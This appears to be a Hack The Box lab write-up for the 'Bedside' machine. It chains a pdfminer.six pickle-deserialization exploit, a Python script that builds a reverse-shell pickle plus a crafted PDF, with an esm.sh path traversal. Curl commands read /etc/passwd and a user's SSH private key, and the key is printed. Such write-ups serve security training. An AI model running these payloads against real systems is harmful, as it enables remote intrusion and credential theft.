# Bedside-HTB
Nmap shows the following info
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 18:24 -0300
Nmap scan report for bedside.htb (10.129.56.155)
Host is up (0.068s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
|_http-title: Bedside Clinic - bedside.htb
|_http-server-header: Apache/2.4.68 (Debian)
3000/tcp filtered ppp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 - 5.14 (96%), Linux 4.15 - 5.19 (96%), HP P2000 G3 NAS device (93%), Linux 2.6.32 - 3.13 (93%), Linux 4.15 (93%), Linux 5.14 - 6.8 (93%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (93%), Linux 3.2 - 4.14 (93%), Linux 2.6.32 - 3.10 (93%), Linux 5.0 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   43.16 ms 10.10.16.1
2   85.39 ms bedside.htb (10.129.56.155)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds
```
So, there is a port 3000 being filtered, probably open to localhost only, that'll come in hand in the future. The rest is pretty standart, port 80 is hosting a website:
<img width="1287" height="752" alt="image" src="https://github.com/user-attachments/assets/03463685-8847-40df-8a51-1779c7fa2d6f" />

This website is useless, nothing very fancy here. Keep recon going, used ffuf to fuzz for subdomains and found this:
```bash
└─$ ffuf -w ../../../SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -fw 21                  
7
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bedside.htb
 :: Wordlist         : FUZZ: /home/spaz/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.bedside.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 21
________________________________________________

research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 71ms]
```

Good. Now, the subdomain has a way for us to upload files:
<img width="961" height="717" alt="image" src="https://github.com/user-attachments/assets/2b468f36-3796-4c4a-a5be-167239d0d1bc" />

Now let's check the resquest and answer with Burp. But first create a test pdf since que page works with pdfs:
<img width="1917" height="247" alt="image" src="https://github.com/user-attachments/assets/0a7e7f37-aaf4-4936-a763-a869cb278ebf" />

So now, upload this test.pdf and follow it with burp to try and get some info:
<img width="1610" height="885" alt="image" src="https://github.com/user-attachments/assets/1781f981-cc77-44b1-b708-6779972390fe" />

There we found something very used: pdfminer.six. A software name, although not alongside a version. But there is one more thing we can explore here. If we create a text file, but with a mismatched type, such as .pdf we get a very revealing error message:
<img width="1047" height="712" alt="image" src="https://github.com/user-attachments/assets/63180308-c354-47d7-9ab5-df8f1f3f7ae6" />

No we also have access to an absolute PATH where everything is uploaded, it is: "/var/www/research.bedside.htb/uploads". Everything we have uploaded rests at that directory, serverside. Next step is search for vulnerabilities for pdfminer.six. I found CVE-2025-64512 while searching online. It seems that there is a problem when parsing pickle files that are needed during interaction with PDF. So the trick is to generate a malicious pickle file, upload it and then generate a malicious PDF file that point directly to our malicious pickle file. This is only possible because we know the path towards the uploads folder: "/var/www/research.bedside.htb/uploads". There is a complete PoC right here: https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp. First crear a .py file to generate the malicious pickle file:
```python
#!/usr/bin/env python3
import pickle
import gzip

def create_demo_pickle():
    print("Creating demonstration pickle file...")

    # Create payload that executes code AND returns a dict (as pdfminer expects)
    class EvilPayload:
        def __reduce__(self):
            # This function will be called during unpickling
            code = "sh -i >& /dev/tcp/<yourIP>/<yourPort> 0>&1"
            return (eval, (code,))

    demo_cmap_data = EvilPayload()

    # Create the pickle file that the path traversal would access
    target_path = "./malicious.pickle.gz"

    try:
        with gzip.open(target_path, 'wb') as f:
            pickle.dump(demo_cmap_data, f)
        print(f"✓ Created demonstration pickle file: {target_path}")
        return target_path

    except Exception as e:
        print(f"✗ Error creating pickle file: {e}")
        return None

if __name__ == "__main__":
    create_demo_pickle()
```
Just make sure to place your ip and desired port here:
```python
code = "sh -i >& /dev/tcp/<yourIP>/<yourPort> 0>&1"
```
Then, you must execute this script to generate the "malicious.pickle.gz" file:
<img width="1917" height="55" alt="image" src="https://github.com/user-attachments/assets/ee85921d-97cf-496e-84c2-7026f7102da3" />

Then create a .pdf file containing this:
```bash
└─$ cat mal.pdf                                                       
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources
<<
/Font
<<
/F1 5 0 R
>>
>>
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Malicious PDF) Tj
ET
endstream
endobj

5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fmalicious.pickle.gz
/DescendantFonts [6 0 R]
>>
endobj

6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /MaliciousFont
/CIDSystemInfo
<<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj

7 0 obj
<<
/Type /FontDescriptor
/FontName /MaliciousFont
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj

xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
```

Now, start the listener:
```bash
nc -lnvp 4444
````

Following that first upload the pickel file:
<img width="876" height="78" alt="image" src="https://github.com/user-attachments/assets/458358b2-b8ad-409d-826e-672347c2b463" />

The upload the .pdf file:
<img width="888" height="78" alt="image" src="https://github.com/user-attachments/assets/7741981c-1306-4e66-a1c8-65f9560491d9" />

After a few seconds, you're going to recieve the shell back to you:
<img width="1917" height="172" alt="image" src="https://github.com/user-attachments/assets/0d57660c-b585-4533-aa7c-16f8513181ab" />

Clearly we are inside a docker container:
<img width="1915" height="80" alt="image" src="https://github.com/user-attachments/assets/40d0cee7-4644-49f4-9c4a-44d39f9aef57" />

Now we know that the usual ways to see open ports are not available:
<img width="1917" height="122" alt="image" src="https://github.com/user-attachments/assets/d6c245c9-bc6c-4e58-baab-44dfa8a26edb" />

But at /tmp we can find something like a porscanner. So let's use it:
<img width="1912" height="71" alt="image" src="https://github.com/user-attachments/assets/bfdb033e-4534-4c33-92ad-864d7393cd63" />
<img width="1916" height="97" alt="image" src="https://github.com/user-attachments/assets/54b06873-ddb3-4c88-b1d0-43770763bf1e" />
<img width="1912" height="168" alt="image" src="https://github.com/user-attachments/assets/d1cb46fe-87f2-4eec-a57c-fd12f8d93224" />

172.17.0.1 is the same as 127.0.0.1 but for containers, this might be usefull in some cases. WHen we used nmap in the context of first recon, por 3000 was filteres for outside contact. But it might be open for the container inside, let's curl it for the code that is running on the server:
```bash
datawrangler@data-wrangler:/tmp$ curl http://172.17.0.1:3000
curl http://172.17.0.1:3000
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bedside Clinic - Image Viewer</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f9fc;
      color: #0b3d91;
      margin: 0;
      padding: 20px;
    }

    h1 {
      text-align: center;
      color: #0b3d91;
    }

    #root {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .viewer {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }

    .mask-grid {
      display: grid;
      grid-template-columns: repeat(5, 40px);
      gap: 2px;
      margin-top: 10px;
    }

    .cell {
      width: 40px;
      height: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
      border-radius: 4px;
      color: #ffffff;
    }

    .cell-0 { background-color: #a0c4ff; }
    .cell-1 { background-color: #0077b6; }

    .controls {
      margin-top: 15px;
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .controls button {
      padding: 6px 12px;
      font-size: 14px;
      border-radius: 4px;
      border: none;
      background-color: #0b3d91;
      color: white;
      cursor: pointer;
    }

    .controls button:disabled {
      background-color: #a0c4ff;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <h1>Bedside Clinic - Image Viewer</h1>
  <div id="root"></div>

  <script type="module">
        import React from './vendor/react.js';
        import ReactDOM from './vendor/react-dom.js';
        import _ from './vendor/lodash.js';

    // Simulate fetching multi-slice MRI + mask data
    async function fetchSlices() {
      // For demo: generate 5 slices with random masks
      const slices = [];
      for (let i = 0; i < 5; i++) {
        const mask = Array.from({ length: 5 }, () =>
          Array.from({ length: 5 }, () => Math.round(Math.random()))
        );
        slices.push({ id: `slice_${i+1}`, mask });
      }
      return slices;
    }

    function MaskGrid({ mask }) {
      return (
        <div className="mask-grid">
          {mask.flat().map((cell, idx) => (
            <div key={idx} className={`cell cell-${cell}`}>{cell}</div>
          ))}
        </div>
      );
    }

    function Viewer({ slices }) {
      const [currentIndex, setCurrentIndex] = React.useState(0);
      const slice = slices[currentIndex];

      const prevSlice = () => setCurrentIndex(idx => Math.max(0, idx - 1));
      const nextSlice = () => setCurrentIndex(idx => Math.min(slices.length - 1, idx + 1));

      return (
        <div className="viewer">
          <h2>{slice.id}</h2>
          <MaskGrid mask={slice.mask} />
          <div className="controls">
            <button onClick={prevSlice} disabled={currentIndex === 0}>Previous Slice</button>
            <span>Slice {currentIndex + 1} / {slices.length}</span>
            <button onClick={nextSlice} disabled={currentIndex === slices.length - 1}>Next Slice</button>
          </div>
        </div>
      );
    }

    function App() {
      const [slices, setSlices] = React.useState([]);

      React.useEffect(() => {
        fetchSlices().then(setSlices);
      }, []);

      return slices.length > 0 ? <Viewer slices={slices} /> : <p>Loading slices...</p>;
    }

    ReactDOM.render(<App />, document.getElementById('root'));
  </script>
</body>
</html>
<script type="module">import createHotContext from"/@hmr";const hot=createHotContext("/index.html");hot.watch(()=>location.reload());</script><script>console.log("%c💚 Built with esm.sh/x, please uncheck \"Disable cache\" in Network tab for better DX!", "color:green")</script>
```

This:
```bash
Built with esm.sh/x, please uncheck \"Disable cache\" in Network tab for better DX!", "color:green")</script>
```
"Built with esm.sh" Built with is a phrase we like to see, because we might find vulns for esm.sh and therefore, the software built with it. After a quick google search I found: https://www.sentinelone.com/vulnerability-database/cve-2025-59341/#cq=i1 and it lead me to https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r let's test this path traversal:
```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
```
We have an answer confirming it works:
```bash
datawrangler@data-wrangler:/app$ curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```
We want to login as developer and the best way to do this is by reading the private ssh key with the following command:
```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
```
This gets us the key, save it to a text file called id_rsa:
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```















